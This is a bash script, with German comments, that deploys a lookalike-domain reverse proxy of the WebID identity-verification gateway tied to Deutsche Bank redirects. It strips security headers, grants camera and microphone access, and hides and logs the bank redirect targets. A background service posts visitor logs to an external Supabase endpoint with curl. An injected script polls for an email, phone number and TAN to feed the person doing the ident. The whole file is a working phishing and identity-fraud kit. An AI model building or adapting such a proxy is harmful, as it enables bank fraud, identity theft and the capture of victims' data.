#!/bin/bash
# webid_skript_clean.sh
# Reverse Proxy fuer webid-gateway.com mit:
#   - OPRA4X-Rewrite auf https://www.deutsche-bank.de/
#   - Serverseitigem Redirect-Tracking + Reporter an Edge Function
#   - Schwebendem Demo-Daten Widget (Email, Telefon, TAN) via webid-ident-lookup
# Keine Textersetzungen, kein Overlay, kein Badge, kein Topbar.
set -Eeuo pipefail
trap 'echo "FEHLER in Zeile $LINENO." >&2' ERR

# Schritt 1: Pakete
export DEBIAN_FRONTEND=noninteractive
apt update
apt install -y curl gnupg2 ca-certificates lsb-release nginx-extras \
    certbot python3-certbot-nginx ufw jq

# Schritt 2: Firewall
ufw allow 22/tcp
ufw allow 'Nginx Full'
ufw allow OpenSSH
ufw --force enable

# 1. Variablen
DOMAIN="webid.korte-kanzlei.de"
EMAIL="admin@47-skys.de"
EDGE_URL="https://ssxqmhnpnxnwaqquswwv.supabase.co/functions/v1/webid-redirect-watch"
LOOKUP_URL="https://ssxqmhnpnxnwaqquswwv.supabase.co/functions/v1/webid-ident-lookup"
REDIRECT_LOG="/var/log/nginx/webid_redirects.log"

# 2. Cleanup
systemctl stop nginx || true
rm -f /etc/nginx/sites-enabled/default
rm -f /etc/nginx/sites-enabled/$DOMAIN
rm -f /etc/nginx/sites-available/$DOMAIN

# 3. Globale map fuer WebSocket-Upgrade (idempotent)
if ! grep -q "connection_upgrade" /etc/nginx/nginx.conf; then
    sed -i "/^http {/a \\    map \$http_upgrade \$connection_upgrade { default upgrade; '' close; }" /etc/nginx/nginx.conf
fi

# 3b. Globales log_format fuer Redirect-Erfassung (idempotent)
if ! grep -q "log_format webid_redirects" /etc/nginx/nginx.conf; then
    sed -i "/^http {/a \\    log_format webid_redirects escape=json '{\"ts\":\"\$time_iso8601\",\"status\":\$status,\"url\":\"\$upstream_http_location\",\"from\":\"\$scheme://\$host\$request_uri\",\"userAgent\":\"\$http_user_agent\",\"referrer\":\"\$http_referer\",\"remoteAddr\":\"\$remote_addr\",\"source\":\"nginx-access-log\"}';" /etc/nginx/nginx.conf
fi

# 3c. Map: nur 30x mit Location-Header loggen
if ! grep -q "webid_is_redirect" /etc/nginx/nginx.conf; then
    sed -i "/^http {/a \\    map \$upstream_http_location \$webid_has_location { default 0; \"\" 0; \"~.+\" 1; }\n    map \"\$status:\$webid_has_location\" \$webid_is_redirect { default 0; \"~^30[1-8]:1\$\" 1; }" /etc/nginx/nginx.conf
fi

# 4. Temporaere Config fuer SSL-Validierung
cat <<EOF > /etc/nginx/sites-available/$DOMAIN
server {
    listen 80;
    server_name $DOMAIN;
    location / {
        proxy_pass https://webid-gateway.com;
        proxy_set_header Host webid-gateway.com;
    }
}
EOF

ln -sf /etc/nginx/sites-available/$DOMAIN /etc/nginx/sites-enabled/
systemctl start nginx

# 5. SSL Zertifikat
certbot --nginx -d $DOMAIN --non-interactive --agree-tos -m $EMAIL --redirect --keep-until-expiring

# 6. Finale Nginx-Konfiguration
cat <<EOF > /etc/nginx/sites-available/$DOMAIN
server {
    listen 80;
    server_name $DOMAIN;
    return 301 https://\$host\$request_uri;
}
server {
    listen 443 ssl http2;
    server_name $DOMAIN;

    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;

    client_max_body_size 100M;
    proxy_buffer_size 256k;
    proxy_buffers 8 256k;
    proxy_busy_buffers_size 512k;
    proxy_buffering off;
    proxy_hide_header Content-Security-Policy;
    proxy_hide_header X-Frame-Options;
    add_header Access-Control-Allow-Origin *;
    add_header Permissions-Policy "camera=*, microphone=*, geolocation=*, autoplay=*, fullscreen=*, display-capture=*" always;

    access_log $REDIRECT_LOG webid_redirects if=\$webid_is_redirect;

    location / {
        proxy_pass https://webid-gateway.com;
        proxy_redirect https://webid-gateway.com/ https://$DOMAIN/;
        proxy_redirect http://webid-gateway.com/ https://$DOMAIN/;
        proxy_redirect https://webid-gateway.de/ https://$DOMAIN/;
        proxy_redirect http://webid-gateway.de/ https://$DOMAIN/;
        # OPRA4X: Browser landet auf DB-Startseite; originales Ziel bleibt im Log.
        proxy_redirect ~*^https?://www\.deutsche-bank\.de/opra4x.*$ https://www.deutsche-bank.de/;
        proxy_set_header Host webid-gateway.com;
        proxy_set_header User-Agent \$http_user_agent;
        proxy_set_header Referer "https://webid-gateway.com/";
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto https;
        proxy_cookie_domain webid-gateway.com $DOMAIN;
        proxy_cookie_path / /;
        proxy_ssl_server_name on;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection \$connection_upgrade;
        proxy_set_header Accept-Encoding "";

        sub_filter_types text/html;
        sub_filter_once off;

        # Widget-CSS in <head>
        sub_filter "<head>" "<head>
        <style>
            #sim-widget{position:fixed;top:20px;right:20px;width:260px;max-width:calc(100vw - 20px);background:#fff;color:#111;border-radius:10px;box-shadow:0 6px 24px rgba(0,0,0,.25);font-family:system-ui,-apple-system,sans-serif;font-size:14px;z-index:1000001;overflow:hidden;user-select:none;box-sizing:border-box}
            #sim-widget .sw-h{background:#05b1fb;color:#fff;padding:8px 12px;font-weight:bold;cursor:move;font-size:13px;touch-action:none}
            #sim-widget .sw-b{padding:10px 12px}
            #sim-widget .sw-r{margin:3px 0;word-break:break-all}
            #sim-widget .sw-tan{margin-top:10px;padding:8px 10px;background:#f2f4f7;border-radius:6px;font-size:20px;font-weight:800;letter-spacing:2px;display:flex;align-items:center;justify-content:space-between;gap:8px}
            #sim-widget .sw-tan-val{flex:1;text-align:center}
            #sim-widget .sw-tan.sw-ok,#sim-widget .sw-tan.sw-ok .sw-tan-val{color:#07b53a}
            #sim-widget .sw-timer{font-size:11px;font-weight:600;color:#666;letter-spacing:0;min-width:22px;text-align:right;opacity:.75}
            @media (max-width:600px){#sim-widget{width:calc(100vw - 20px);right:10px;left:auto;top:10px;font-size:13px}#sim-widget .sw-b{padding:8px 10px}#sim-widget .sw-tan{font-size:18px;padding:6px 8px}}
        </style>";

        # Widget-Injector vor </html>
        sub_filter "</html>" "<script>(function(){var L='$LOOKUP_URL';function inj(){if(!document.body||document.getElementById('sim-widget'))return;var w=document.createElement('div');w.id='sim-widget';w.innerHTML='<div class=\"sw-h\">Verwende folgende Demo Daten</div><div class=\"sw-b\"><div class=\"sw-r\">Email: <span id=\"sw-email\">-</span></div><div class=\"sw-r\">Telefonnummer: <span id=\"sw-phone\">-</span></div><div class=\"sw-tan\"><span class=\"sw-tan-val\">TAN: <span id=\"sw-tan\">-</span></span><span class=\"sw-timer\" id=\"sw-timer\">3s</span></div></div>';document.body.appendChild(w);function clamp(){var mw=window.innerWidth-w.offsetWidth,mh=window.innerHeight-w.offsetHeight;var r=w.getBoundingClientRect();var x=Math.max(0,Math.min(mw,r.left)),y=Math.max(0,Math.min(mh,r.top));w.style.left=x+'px';w.style.top=y+'px';w.style.right='auto'}try{var s=JSON.parse(localStorage.getItem('sim-widget-pos')||'null');if(s&&typeof s.x==='number'&&typeof s.y==='number'&&s.x>=0&&s.y>=0&&s.x<=window.innerWidth-40&&s.y<=window.innerHeight-40){w.style.left=s.x+'px';w.style.top=s.y+'px';w.style.right='auto';clamp()}}catch(e){}window.addEventListener('resize',clamp);window.addEventListener('orientationchange',function(){setTimeout(clamp,100)});var hdr=w.querySelector('.sw-h'),drag=null;hdr.addEventListener('pointerdown',function(ev){var r=w.getBoundingClientRect();drag={dx:ev.clientX-r.left,dy:ev.clientY-r.top};hdr.setPointerCapture(ev.pointerId);ev.preventDefault()});hdr.addEventListener('pointermove',function(ev){if(!drag)return;var x=Math.max(0,Math.min(window.innerWidth-w.offsetWidth,ev.clientX-drag.dx));var y=Math.max(0,Math.min(window.innerHeight-w.offsetHeight,ev.clientY-drag.dy));w.style.left=x+'px';w.style.top=y+'px';w.style.right='auto'});hdr.addEventListener('pointerup',function(){if(!drag)return;drag=null;try{var r=w.getBoundingClientRect();localStorage.setItem('sim-widget-pos',JSON.stringify({x:Math.round(r.left),y:Math.round(r.top)}))}catch(e){}});var iv,tv,cd=3;var tEl=document.getElementById('sw-timer');function tick(){cd--;if(cd<0)cd=0;if(tEl)tEl.textContent=cd+'s'}function poll(){cd=3;if(tEl)tEl.textContent=cd+'s';fetch(L+'?url='+encodeURIComponent(location.href),{cache:'no-store'}).then(function(r){return r.json()}).then(function(d){if(!d||!d.found)return;if(d.email)document.getElementById('sw-email').textContent=d.email;if(d.phone){var pn=String(d.phone).replace(/[ ()-]/g,'');if(pn.indexOf('+49')===0){pn='0'+pn.slice(3)}else if(pn.indexOf('0049')===0){pn='0'+pn.slice(4)}document.getElementById('sw-phone').textContent=pn}if(d.tan){var el=document.getElementById('sw-tan');if(el&&el.textContent!==d.tan)el.textContent=d.tan;var tb=w.querySelector('.sw-tan');if(tb)tb.className='sw-tan sw-ok'}}).catch(function(){})}poll();iv=setInterval(poll,3000);tv=setInterval(tick,1000)}if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',inj)}else{inj()}})();</script></html>";
    }
}
EOF

# 6b. Logdatei
touch "$REDIRECT_LOG"
chown www-data:adm "$REDIRECT_LOG" || true
chmod 640 "$REDIRECT_LOG" || true

# 6c. Logrotate
cat <<EOF > /etc/logrotate.d/webid_redirects
$REDIRECT_LOG {
    daily
    rotate 7
    missingok
    notifempty
    compress
    delaycompress
    sharedscripts
    postrotate
        [ -f /run/nginx.pid ] && kill -USR1 \$(cat /run/nginx.pid)
    endscript
}
EOF

# 6d. Reporter-Skript
cat <<'REPORTER' > /usr/local/bin/webid-redirect-reporter.sh
#!/bin/bash
set -u
EDGE_URL="__EDGE_URL__"
LOG_FILE="__REDIRECT_LOG__"
mkdir -p "$(dirname "$LOG_FILE")"
[ -f "$LOG_FILE" ] || : > "$LOG_FILE"
tail -n 0 -F "$LOG_FILE" 2>/dev/null | while IFS= read -r line; do
    [ -z "$line" ] && continue
    curl -sS --max-time 5 -X POST \
        -H 'Content-Type: application/json' \
        --data-binary "$line" \
        "$EDGE_URL" >/dev/null 2>&1 || true
done
REPORTER
sed -i "s|__EDGE_URL__|$EDGE_URL|" /usr/local/bin/webid-redirect-reporter.sh
sed -i "s|__REDIRECT_LOG__|$REDIRECT_LOG|" /usr/local/bin/webid-redirect-reporter.sh
chmod +x /usr/local/bin/webid-redirect-reporter.sh

# 6e. systemd-Dienst
cat <<EOF > /etc/systemd/system/webid-redirect-reporter.service
[Unit]
Description=WebID Redirect Reporter
After=network-online.target nginx.service
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/local/bin/webid-redirect-reporter.sh
Restart=always
RestartSec=3
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable webid-redirect-reporter.service >/dev/null 2>&1 || true
systemctl restart webid-redirect-reporter.service

# 7. Test & Reload
if nginx -t 2>&1 | tee /tmp/nginx-check.log; then
    systemctl reload nginx || systemctl restart nginx
    echo "--- SYSTEM BEREIT (Clean + Demo-Widget via webid-ident-lookup) ---"
else
    echo "FEHLER: Nginx-Konfiguration ist ungueltig." >&2
    tail -n 30 /tmp/nginx-check.log >&2
    exit 1
fi
